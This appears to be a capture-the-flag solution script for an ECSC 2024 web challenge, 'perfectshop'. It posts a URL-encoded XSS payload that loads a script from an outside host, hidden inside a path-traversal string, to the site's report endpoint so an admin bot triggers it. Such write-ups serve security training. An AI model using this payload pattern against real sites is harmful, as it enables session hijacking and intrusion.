import requests
from urllib.parse import quote

base_URL = 'http://perfectshop.challs.open.ecsc2024.it/'

url_encoded_xss = quote("<script src='https://example.com/admin'></script>")

payload = {
    'id': f'1/../../search?q={url_encoded_xss}&/admin'
}

res = requests.post(f'{base_URL}report', data=payload)